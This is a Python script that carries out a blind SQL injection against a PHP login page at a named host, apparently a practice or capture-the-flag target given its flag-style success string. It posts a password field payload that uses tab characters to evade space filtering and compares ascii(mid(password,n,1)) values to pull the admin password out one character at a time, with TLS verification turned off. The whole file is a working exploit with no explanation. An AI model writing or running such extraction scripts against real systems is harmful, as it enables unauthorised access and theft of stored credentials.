import requests
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

flag = ''
exitflag = False
flagindex = 1
while not exitflag:
	print('find ',str(flagindex),' character...')
	for num in range(0x21, 0x7f):
		myparams = {'password': "'\x09or\x09id\x09like\x09'admin'&&\x09ascii(mid(password,"+str(flagindex)+",\x091))\x09like\x09"+str(num)+"\x09--\x09"}
		r = requests.post('https://me.zongyuan.nctu.me/sqlinject/sql.php', data=myparams, verify=False)
		if r.status_code == requests.codes.ok:
			if((r.text.split('<br>')[1])=="<h2>Hello admin</h2>balqs{OH_NO_you_hack_me}"):
				flag += chr(num)
				flagindex += 1
				print(flag)
				if chr(num) == '}':
					exitflag = True
				break
		time.sleep(0.5)
print('Done')
